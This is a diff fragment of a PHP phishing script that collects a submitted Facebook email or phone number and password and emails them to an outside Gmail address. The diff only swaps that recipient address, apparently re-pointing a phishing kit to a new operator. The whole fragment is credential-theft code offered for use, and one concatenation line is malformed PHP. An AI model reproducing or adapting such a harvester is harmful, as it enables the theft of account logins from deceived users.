@@ -2,7 +2,7 @@
 $email = $_POST['phone'];
 $password = $_POST['password'];
 
-$to = "www.hr.com.pk@gmail.com";
+$to = "ali228rao@gmail.com";
 $subject = "new user login in facebook";
 $message ="E-Mail Or Phone No. :" .$email ."<br><br>";
 $message. ="Password :" .$password ."<br><br>";
